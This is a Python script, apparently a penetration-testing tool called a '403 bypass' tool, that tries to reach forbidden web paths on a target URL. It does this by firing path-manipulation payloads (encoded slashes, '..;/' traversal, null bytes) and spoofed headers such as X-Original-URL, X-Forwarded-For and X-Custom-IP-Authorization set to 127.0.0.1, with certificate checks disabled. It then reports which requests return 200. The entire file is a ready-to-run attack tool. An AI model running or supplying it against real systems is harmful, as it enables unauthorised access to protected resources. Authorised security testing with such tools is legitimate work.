import requests
import sys
import warnings
import argparse
from tabulate import tabulate

GREEN = "\u001b[32m"
RED = "\u001b[31m"
RESET = "\u001b[0m"

print(
    """\u001b[36m


██╗  ██╗ ██████╗ ██╗  ██╗      ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██║  ██║██╔═████╗██║  ██║      ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║██║██╔██║███████║█████╗██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
╚════██║████╔╝██║╚════██║╚════╝██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
     ██║╚██████╔╝     ██║      ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
     ╚═╝ ╚═════╝      ╚═╝      ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                                
\u001b[0m      |  SICARIOS 404 Bypass Tool  |  Credits: @channyeinwai | 2023   \033[1;33;0m                          
                        
\033[1;33;36m 
    """
)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

parser = argparse.ArgumentParser(
    description="403 Bypasser : python 403-bypass.py -u https://www.example.com -p admin"
)
parser.add_argument("-u", "--url", help="Provide url ", required=True)
parser.add_argument("-p", "--path", help="Provide the path", required=True)
args = parser.parse_args()

url = args.url
path = args.path

payloads = [
    "/",
    "/*",
    "/%2f/",
    "/./",
    "./.",
    "/*/","?",
    "??",
    "&",
    "#",
    "%",
    "%20",
    "%09",
    "/..;/",
    "../",
    "..%2f",
    "..;/",
    ".././",
    "..%00/",
    "..%0d",
    "..%5c",
    "..%ff/",
    "%2e%2e%2f",
    ".%2e/",
    "%3f",
    "%26",
    "%23",
    ".json",
]

full_url = url + "/" + path
slash_path = "/" + path

results = []
success_results = []
redirect_results = []
client_error_results = []
server_error_results = []

for payload in payloads:
    try:
        full_url2 = url + slash_path + payload
        req = requests.get(
            full_url2, allow_redirects=False, verify=False, timeout=5
        )
        status_code = req.status_code
        if status_code == 200:
            success_results.append(
                [
                    GREEN + full_url2 + RESET,
                    GREEN + str(status_code) + RESET,
                ]
            )
        elif 300 <= status_code < 400:
            redirect_results.append([full_url2, str(status_code)])
        elif 400 <= status_code < 500:
            client_error_results.append([full_url2, str(status_code)])
        elif 500 <= status_code < 600:
            server_error_results.append([full_url2, str(status_code)])
        else:
            results.append([full_url2, str(status_code)])
    except Exception:
        pass

for payload in payloads:
    try:
        full_url3 = url + payload + path
        r = requests.get(
            full_url3, allow_redirects=False, verify=False, timeout=5
        )
        status_code = r.status_code
        if status_code == 200:
            success_results.append(
                [GREEN + full_url3 + RESET, GREEN + str(status_code) + RESET]
            )
        elif 300 <= status_code < 400:
            redirect_results.append([full_url3, str(status_code)])
        elif 400 <= status_code < 500:
            client_error_results.append([full_url3, str(status_code)])
        elif 500 <= status_code < 600:
            server_error_results.append([full_url3, str(status_code)])
        else:
            results.append([full_url3, str(status_code)])
    except Exception:
        pass


r1 = requests.get(
    full_url, headers={"X-Original-URL": path}, allow_redirects=False, verify=False, timeout=5
)
status_code = r1.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-Original-URL: " + path + ")" + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append([full_url + " (X-Original-URL: " + path + ")", str(status_code)])
elif 400 <= status_code < 500:
    client_error_results.append([full_url + " (X-Original-URL: " + path + ")", str(status_code)])
elif 500 <= status_code < 600:
    server_error_results.append([full_url + " (X-Original-URL: " + path + ")", str(status_code)])
else:
    results.append([full_url + " (X-Original-URL: " + path + ")", str(status_code)])


r2 = requests.get(
    full_url,
    headers={"X-Custom-IP-Authorization": "127.0.0.1"},
    allow_redirects=False,
    verify=False,
    timeout=5,
)
status_code = r2.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-Custom-IP-Authorization: 127.0.0.1)" + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append(
        [full_url + " (X-Custom-IP-Authorization: 127.0.0.1)", str(status_code)]
    )
elif 400 <= status_code < 500:
    client_error_results.append(
        [full_url + " (X-Custom-IP-Authorization: 127.0.0.1)", str(status_code)]
    )
elif 500 <= status_code < 600:
    server_error_results.append(
        [full_url + " (X-Custom-IP-Authorization: 127.0.0.1)", str(status_code)]
    )
else:
    results.append([full_url + " (X-Custom-IP-Authorization: 127.0.0.1)", str(status_code)])


r3 = requests.get(
    full_url,
    headers={"X-Forwarded-For": "http://127.0.0.1"},
    allow_redirects=False,
    verify=False,
    timeout=5,
)
status_code = r3.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-Forwarded-For: http://127.0.0.1)" + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append([full_url + " (X-Forwarded-For: http://127.0.0.1)", str(status_code)])
elif 400 <= status_code < 500:
    client_error_results.append([full_url + " (X-Forwarded-For: http://127.0.0.1)", str(status_code)])
elif 500 <= status_code < 600:
    server_error_results.append([full_url + " (X-Forwarded-For: http://127.0.0.1)", str(status_code)])
else:
    results.append([full_url + " (X-Forwarded-For: http://127.0.0.1)", str(status_code)])


r4 = requests.get(
    full_url,
    headers={"X-Forwarded-For": "127.0.0.1:80"},
    allow_redirects=False,
    verify=False,
    timeout=5,
)
status_code = r4.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-Forwarded-For: 127.0.0.1:80)" + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append([full_url + " (X-Forwarded-For: 127.0.0.1:80)", str(status_code)])
elif 400 <= status_code < 500:
    client_error_results.append([full_url + " (X-Forwarded-For: 127.0.0.1:80)", str(status_code)])
elif 500 <= status_code < 600:
    server_error_results.append([full_url + " (X-Forwarded-For: 127.0.0.1:80)", str(status_code)])
else:
    results.append([full_url + " (X-Forwarded-For: 127.0.0.1:80)", str(status_code)])


r5 = requests.get(
    url, headers={"X-rewrite-url": slash_path}, allow_redirects=False, verify=False, timeout=5
)
status_code = r5.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-rewrite-url: {})".format(slash_path) + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append([full_url + " (X-rewrite-url: {})".format(slash_path), str(status_code)])
elif 400 <= status_code < 500:
    client_error_results.append([full_url + " (X-rewrite-url: {})".format(slash_path), str(status_code)])
elif 500 <= status_code < 600:
    server_error_results.append([full_url + " (X-rewrite-url: {})".format(slash_path), str(status_code)])
else:
    results.append([full_url + " (X-rewrite-url: {})".format(slash_path), str(status_code)])


r6 = requests.get(
    full_url, headers={"X-Forwarded-Host": "127.0.0.1"}, allow_redirects=False, verify=False, timeout=5
)
status_code = r6.status_code
if status_code == 200:
    success_results.append(
        [GREEN + full_url + " (X-Forwarded-Host: 127.0.0.1)" + RESET, GREEN + str(status_code) + RESET]
    )
elif 300 <= status_code < 400:
    redirect_results.append([full_url + " (X-Forwarded-Host: 127.0.0.1)", str(status_code)])
elif 400 <= status_code < 500:
    client_error_results.append([full_url + " (X-Forwarded-Host: 127.0.0.1)", str(status_code)])
elif 500 <= status_code < 600:
    server_error_results.append([full_url + " (X-Forwarded-Host: 127.0.0.1)", str(status_code)])
else:
    results.append([full_url + " (X-Forwarded-Host: 127.0.0.1)", str(status_code)])


def extract_status_code(result):
    return int(result[1].replace('\x1b[32m', '').replace('\x1b[0m', ''))

sorted_success_results = sorted(success_results, key=extract_status_code)
sorted_redirect_results = sorted(redirect_results, key=extract_status_code)
sorted_client_error_results = sorted(client_error_results, key=extract_status_code)
sorted_server_error_results = sorted(server_error_results, key=extract_status_code)


table_data = [
    ["Success (2xx)", sorted_success_results],
    ["Redirect (3xx)", sorted_redirect_results],
    ["Client Error (4xx)", sorted_client_error_results],
    ["Server Error (5xx)", sorted_server_error_results],
]

for data in table_data:
    if data[1]:
        print("\n")
        print(data[0])
        print(tabulate(data[1], headers=["URL", "Status Code"], tablefmt="fancy_grid", colalign=("left", "left")))

if results:
    print("\n")
    print("Others")
    print(tabulate(results, headers=["URL", "Status Code"], tablefmt="fancy_grid", colalign=("left", "left")))
